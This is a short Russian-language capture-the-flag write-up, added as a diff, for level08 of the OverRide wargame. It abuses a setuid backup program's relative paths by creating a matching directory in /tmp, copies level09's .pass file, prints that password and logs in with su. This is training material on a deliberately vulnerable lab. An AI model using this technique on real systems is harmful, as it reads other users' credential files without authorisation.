@@ -1,0 +1,32 @@
+Используя команду String убедились, что программа использует только относительные пути:
+
+Usage: %s filename
+./backups/.log
+ERROR: Failed to open %s
+Starting back up:
+./backups/
+ERROR: Failed to open %s%s
+Finished back up
+
+
+У нас нет прав создавать файлы в /home
+Так что начинаем работать из папки /tmp/:
+cd /tmp/
+
+Пробуем запустить программу
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+При нужном нам параметре необходимо что бы существовал путь : ./backups//home/users/level09/
+Создадим его через команду :
+mkdir -p ./backups//home/users/level09/
+
+Еще раз запустим исполняемый файл
+~/level08 /home/users/level09/.pass
+cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+level08@OverRide:/tmp$ su level09
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
